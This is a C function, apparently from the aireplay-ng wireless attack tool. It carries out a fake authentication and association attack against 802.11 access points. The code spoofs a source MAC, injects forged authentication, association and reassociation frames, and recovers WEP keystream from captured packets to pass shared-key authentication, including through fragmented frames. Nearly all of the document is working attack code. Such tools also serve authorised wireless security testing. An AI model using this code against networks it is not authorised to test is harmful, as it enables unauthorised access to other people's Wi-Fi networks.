int do_attack_fake_auth( void )
{
    time_t tt, tr;
    struct timeval tv, tv2, tv3;

    fd_set rfds;
    int i, n, state, caplen, z;
    int mi_b, mi_s, mi_d;
    int x_send;
    int kas;
    int tries;
    int retry = 0;
    int abort;
    int gotack = 0;
    unsigned char capa[2];
    int deauth_wait=3;
    int ska=0;
    int keystreamlen=0;
    int challengelen=0;
    int weight[16];
    int notice=0;
    int packets=0;
    int aid=0;

    unsigned char ackbuf[14];
    unsigned char ctsbuf[10];
    unsigned char iv[4];
    unsigned char challenge[2048];
    unsigned char keystream[2048];


    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a source MAC (-h).\n" );
        return( 1 );
    }

    if(getnet(capa, 0, 1) != 0)
        return 1;

    if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
    {
        printf( "Please specify an ESSID (-e).\n" );
        return 1;
    }

    memcpy( ackbuf, "\xD4\x00\x00\x00", 4 );
    memcpy( ackbuf +  4, opt.r_bssid, 6 );
    memset( ackbuf + 10, 0, 4 );

    memcpy( ctsbuf, "\xC4\x00\x94\x02", 4 );
    memcpy( ctsbuf +  4, opt.r_bssid, 6 );

    tries = 0;
    abort = 0;
    state = 0;
    x_send=opt.npackets;
    if(opt.npackets == 0)
        x_send=4;

    if(opt.prga != NULL)
        ska=1;

    tt = time( NULL );
    tr = time( NULL );

    while( 1 )
    {
        switch( state )
        {
            case 0:
				if (opt.f_retry > 0) {
					if (retry == opt.f_retry) {
						abort = 1;
						return 1;
					}
					++retry;
				}

                if(ska && keystreamlen == 0)
                {
                    opt.fast = 1;  //don't ask for approval
                    memcpy(opt.f_bssid, opt.r_bssid, 6);    //make the filter bssid the same, that is used for auth'ing
                    if(opt.prga==NULL)
                    {
                        while(keystreamlen < 16)
                        {
                            capture_ask_packet(&caplen, 1);    //wait for data packet
                            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
                            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                                z+=2;

                            memcpy(iv, h80211+z, 4); //copy IV+IDX
                            i = known_clear(keystream, &keystreamlen, weight, h80211, caplen-z-4-4); //recover first bytes
                            if(i>1)
                            {
                                keystreamlen=0;
                            }
                            for(i=0;i<keystreamlen;i++)
                                keystream[i] ^= h80211[i+z+4];
                        }
                    }
                    else
                    {
                        keystreamlen = opt.prgalen-4;
                        memcpy(iv, opt.prga, 4);
                        memcpy(keystream, opt.prga+4, keystreamlen);
                    }
                }

                state = 1;
                tt = time( NULL );

                /* attempt to authenticate */

                memcpy( h80211, AUTH_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );
                if(ska)
                    h80211[24]=0x01;

                printf("\n");
                PCT; printf( "Sending Authentication Request" );
                if(!ska)
                    printf(" (Open System)");
                else
                    printf(" (Shared Key)");
                fflush( stdout );
                gotack=0;

                for( i = 0; i < x_send; i++ )
                {
                    if( send_packet( h80211, 30 ) < 0 )
                        return( 1 );

                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 1:

                /* waiting for an authentication response */

                if( time( NULL ) - tt >= 2 )
                {
                    if(opt.npackets > 0)
                    {
                        tries++;

                        if( tries > 15  )
                        {
                            abort = 1;
                        }
                    }
                    else
                    {
                        if( x_send < 256 )
                        {
                            x_send *= 2;
                        }
                        else
                        {
                            abort = 1;
                        }
                    }

                    if( abort )
                    {
                        printf(
    "\nAttack was unsuccessful. Possible reasons:\n\n"
    "    * Perhaps MAC address filtering is enabled.\n"
    "    * Check that the BSSID (-a option) is correct.\n"
    "    * Try to change the number of packets (-o option).\n"
    "    * The driver/card doesn't support injection.\n"
    "    * This attack sometimes fails against some APs.\n"
    "    * The card is not on the same channel as the AP.\n"
    "    * You're too far from the AP. Get closer, or lower\n"
    "      the transmit rate.\n\n" );
                        return( 1 );
                    }

                    state = 0;
                    challengelen = 0;
                    printf("\n");
                }

                break;

            case 2:

                state = 3;
                tt = time( NULL );

                /* attempt to authenticate using ska */

                memcpy( h80211, AUTH_REQ, 30 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );
                h80211[1] |= 0x40; //set wep bit, as this frame is encrypted
                memcpy(h80211+24, iv, 4);
                memcpy(h80211+28, challenge, challengelen);
                h80211[28] = 0x01; //its always ska in state==2
                h80211[30] = 0x03; //auth sequence number 3
                fflush(stdout);

                if(keystreamlen < challengelen+4 && notice == 0)
                {
                    notice = 1;
                    if(opt.prga != NULL)
                    {
                        PCT; printf( "Specified xor file (-y) is too short, you need at least %d keystreambytes.\n", challengelen+4);
                    }
                    else
                    {
                        PCT; printf( "You should specify a xor file (-y) with at least %d keystreambytes\n", challengelen+4);
                    }
                    PCT; printf( "Trying fragmented shared key fake auth.\n");
                }
                PCT; printf( "Sending encrypted challenge." );
                fflush( stdout );
                gotack=0;
                gettimeofday(&tv2, NULL);

                for( i = 0; i < x_send; i++ )
                {
                    if(keystreamlen < challengelen+4)
                    {
                        packets=(challengelen)/(keystreamlen-4);
                        if( (challengelen)%(keystreamlen-4) != 0 )
                            packets++;

                        memcpy(h80211+24, challenge, challengelen);
                        h80211[24]=0x01;
                        h80211[26]=0x03;
                        send_fragments(h80211, challengelen+24, iv, keystream, keystreamlen-4, 1);
                    }
                    else
                    {
                        add_icv(h80211, challengelen+28, 28);
                        xor_keystream(h80211+28, keystream, challengelen+4);
                        send_packet(h80211, 24+4+challengelen+4);
                    }

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 3:

                /* waiting for an authentication response (using ska) */

                if( time( NULL ) - tt >= 2 )
                {
                    if(opt.npackets > 0)
                    {
                        tries++;

                        if( tries > 15  )
                        {
                            abort = 1;
                        }
                    }
                    else
                    {
                        if( x_send < 256 )
                        {
                            x_send *= 2;
                        }
                        else
                        {
                            abort = 1;
                        }
                    }

                    if( abort )
                    {
                        printf(
    "\nAttack was unsuccessful. Possible reasons:\n\n"
    "    * Perhaps MAC address filtering is enabled.\n"
    "    * Check that the BSSID (-a option) is correct.\n"
    "    * Try to change the number of packets (-o option).\n"
    "    * The driver/card doesn't support injection.\n"
    "    * This attack sometimes fails against some APs.\n"
    "    * The card is not on the same channel as the AP.\n"
    "    * You're too far from the AP. Get closer, or lower\n"
    "      the transmit rate.\n\n" );
                        return( 1 );
                    }

                    state = 0;
                    challengelen=0;
                    printf("\n");
                }

                break;

            case 4:

                tries = 0;
                state = 5;
                if(opt.npackets == -1) x_send *= 2;
                tt = time( NULL );

                /* attempt to associate */

                memcpy( h80211, ASSOC_REQ, 28 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                n = strlen( opt.r_essid );
                if( n > 32 ) n = 32;

                h80211[28] = 0x00;
                h80211[29] = n;

                memcpy( h80211 + 30, opt.r_essid,  n );
                memcpy( h80211 + 30 + n, RATES, 16 );
                memcpy( h80211 + 24, capa, 2);

                PCT; printf( "Sending Association Request" );
                fflush( stdout );
                gotack=0;

                for( i = 0; i < x_send; i++ )
                {
                    if( send_packet( h80211, 46 + n ) < 0 )
                        return( 1 );

                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 5:

                /* waiting for an association response */

                if( time( NULL ) - tt >= 5 )
                {
                    if( x_send < 256 && (opt.npackets == -1) )
                        x_send *= 4;

                    state = 0;
                    challengelen = 0;
                    printf("\n");
                }

                break;

            case 6:

                if( opt.a_delay == 0 && opt.reassoc == 0 )
                {
                    printf("\n");
                    return( 0 );
                }

                if( opt.a_delay == 0 && opt.reassoc == 1 )
                {
                    if(opt.npackets == -1) x_send = 4;
                    state = 7;
                    challengelen = 0;
                    break;
                }

                if( time( NULL ) - tt >= opt.a_delay )
                {
                    if(opt.npackets == -1) x_send = 4;
                    if( opt.reassoc == 1 ) state = 7;
                    else state = 0;
                    challengelen = 0;
                    break;
                }

                if( time( NULL ) - tr >= opt.delay )
                {
                    tr = time( NULL );
                    printf("\n");
                    PCT; printf( "Sending keep-alive packet" );
                    fflush( stdout );
                    gotack=0;

                    memcpy( h80211, NULL_DATA, 24 );
                    memcpy( h80211 +  4, opt.r_bssid, 6 );
                    memcpy( h80211 + 10, opt.r_smac,  6 );
                    memcpy( h80211 + 16, opt.r_bssid, 6 );

                    if( opt.npackets > 0 ) kas = opt.npackets;
                    else kas = 32;

                    for( i = 0; i < kas; i++ )
                        if( send_packet( h80211, 24 ) < 0 )
                            return( 1 );
                }

                break;

            case 7:

                /* sending reassociation request */

                tries = 0;
                state = 8;
                if(opt.npackets == -1) x_send *= 2;
                tt = time( NULL );

                /* attempt to reassociate */

                memcpy( h80211, REASSOC_REQ, 34 );
                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_smac , 6 );
                memcpy( h80211 + 16, opt.r_bssid, 6 );

                n = strlen( opt.r_essid );
                if( n > 32 ) n = 32;

                h80211[34] = 0x00;
                h80211[35] = n;

                memcpy( h80211 + 36, opt.r_essid,  n );
                memcpy( h80211 + 36 + n, RATES, 16 );
                memcpy( h80211 + 30, capa, 2);

                PCT; printf( "Sending Reassociation Request" );
                fflush( stdout );
                gotack=0;

                for( i = 0; i < x_send; i++ )
                {
                    if( send_packet( h80211, 52 + n ) < 0 )
                        return( 1 );

                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                    usleep(10);

                    if( send_packet( ackbuf, 14 ) < 0 )
                        return( 1 );
                }

                break;

            case 8:

                /* waiting for a reassociation response */

                if( time( NULL ) - tt >= 5 )
                {
                    if( x_send < 256 && (opt.npackets == -1) )
                        x_send *= 4;

                    state = 7;
                    challengelen = 0;
                    printf("\n");
                }

                break;

            default: break;
        }

        /* read one frame */

        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        tv.tv_sec  = 1;
        tv.tv_usec = 0;

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
        {
            if( errno == EINTR ) continue;
            perror( "select failed" );
            return( 1 );
        }

        if( ! FD_ISSET( dev.fd_in, &rfds ) )
            continue;

        caplen = read_packet( h80211, sizeof( h80211 ), NULL );

        if( caplen  < 0 ) return( 1 );
        if( caplen == 0 ) continue;

        if( caplen == 10 && h80211[0] == 0xD4)
        {
            if( memcmp(h80211+4, opt.r_smac, 6) == 0 )
            {
                gotack++;
                if(gotack==1)
                {
                    printf(" [ACK]");
                    fflush( stdout );
                }
            }
        }

        gettimeofday(&tv3, NULL);

        //wait 100ms for acks
        if ( (((tv3.tv_sec*1000000 - tv2.tv_sec*1000000) + (tv3.tv_usec - tv2.tv_usec)) > (100*1000)) &&
              (gotack > 0) && (gotack < packets) && (state == 3) && (packets > 1) )
        {
            PCT; printf("Not enough acks, repeating...\n");
            state=2;
            continue;
        }

        if( caplen < 24 )
            continue;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
            default: mi_b = 10; mi_d = 16; mi_s = 24; break;
        }

        /* check if the dest. MAC is ours and source == AP */

        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&
            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&
            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )
        {
            /* check if we got an deauthentication packet */

            if( h80211[0] == 0xC0 ) //removed && state == 4
            {
                printf("\n");
                PCT; printf( "Got a deauthentication packet! (Waiting %d seconds)\n", deauth_wait );
                if(opt.npackets == -1) x_send = 4;
                state = 0;
                challengelen = 0;
                read_sleep( deauth_wait * 1000000 );
                deauth_wait += 2;
                continue;
            }

            /* check if we got an disassociation packet */

            if( h80211[0] == 0xA0 && state == 6 )
            {
                printf("\n");
                PCT; printf( "Got a disassociation packet! (Waiting %d seconds)\n", deauth_wait );
                if(opt.npackets == -1) x_send = 4;
                state = 0;
                challengelen = 0;
                read_sleep( deauth_wait );
                deauth_wait += 2;
                continue;
            }

            /* check if we got an authentication response */

            if( h80211[0] == 0xB0 && (state == 1 || state == 3) )
            {
                if(ska)
                {
                    if( (state==1 && h80211[26] != 0x02) || (state==3 && h80211[26] != 0x04) )
                        continue;
                }

                printf("\n");
                PCT;

                state = 0;

                if( caplen < 30 )
                {
                    printf( "Error: packet length < 30 bytes\n" );
                    read_sleep( 3*1000000 );
                    challengelen = 0;
                    continue;
                }

                if( (h80211[24] != 0 || h80211[25] != 0) && ska==0)
                {
                    ska=1;
                    printf("Switching to shared key authentication\n");
                    read_sleep(2*1000000);  //read sleep 2s
                    challengelen = 0;
                    continue;
                }

                n = h80211[28] + ( h80211[29] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                        printf( "AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\n",
                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],
                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
                        break;

                    case 10:
                        printf( "AP rejects our capabilities\n" );
                        break;

                    case 13:
                    case 15:
                        ska=1;
                        if(h80211[26] == 0x02)
                            printf("Switching to shared key authentication\n");
                        if(h80211[26] == 0x04)
                        {
                            printf("Challenge failure\n");
                            challengelen=0;
                        }
                        read_sleep(2*1000000);  //read sleep 2s
                        challengelen = 0;
                        continue;
                    default:
                        break;
                    }

                    printf( "Authentication failed (code %d)\n", n );
                    if(opt.npackets == -1) x_send = 4;
                    read_sleep( 3*1000000 );
                    challengelen = 0;
                    continue;
                }

                if(ska && h80211[26]==0x02 && challengelen == 0)
                {
                    memcpy(challenge, h80211+24, caplen-24);
                    challengelen=caplen-24;
                }
                if(ska)
                {
                    if(h80211[26]==0x02)
                    {
                        state = 2;      /* grab challenge */
                        printf( "Authentication 1/2 successful\n" );
                    }
                    if(h80211[26]==0x04)
                    {
                        state = 4;
                        printf( "Authentication 2/2 successful\n" );
                    }
                }
                else
                {
                    printf( "Authentication successful\n" );
                    state = 4;      /* auth. done */
                }
            }

            /* check if we got an association response */

            if( h80211[0] == 0x10 && state == 5 )
            {
                printf("\n");
                state = 0; PCT;

                if( caplen < 30 )
                {
                    printf( "Error: packet length < 30 bytes\n" );
                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                n = h80211[26] + ( h80211[27] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                        printf( "Denied (code  1), is WPA in use ?\n" );
                        break;

                    case 10:
                        printf( "Denied (code 10), open (no WEP) ?\n" );
                        break;

                    case 12:
                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
                        break;

                    default:
                        printf( "Association denied (code %d)\n", n );
                        break;
                    }

                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);
                printf( "Association successful :-) (AID: %d)\n", aid );
                deauth_wait = 3;
                fflush( stdout );

                tt = time( NULL );
                tr = time( NULL );

                state = 6;      /* assoc. done */
            }

            /* check if we got an reassociation response */

            if( h80211[0] == 0x30 && state == 8 )
            {
                printf("\n");
                state = 7; PCT;

                if( caplen < 30 )
                {
                    printf( "Error: packet length < 30 bytes\n" );
                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                n = h80211[26] + ( h80211[27] << 8 );

                if( n != 0 )
                {
                    switch( n )
                    {
                    case  1:
                        printf( "Denied (code  1), is WPA in use ?\n" );
                        break;

                    case 10:
                        printf( "Denied (code 10), open (no WEP) ?\n" );
                        break;

                    case 12:
                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
                        break;

                    default:
                        printf( "Reassociation denied (code %d)\n", n );
                        break;
                    }

                    sleep( 3 );
                    challengelen = 0;
                    continue;
                }

                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);
                printf( "Reassociation successful :-) (AID: %d)\n", aid );
                deauth_wait = 3;
                fflush( stdout );

                tt = time( NULL );
                tr = time( NULL );

                state = 6;      /* reassoc. done */
            }
        }
    }

    return( 0 );
}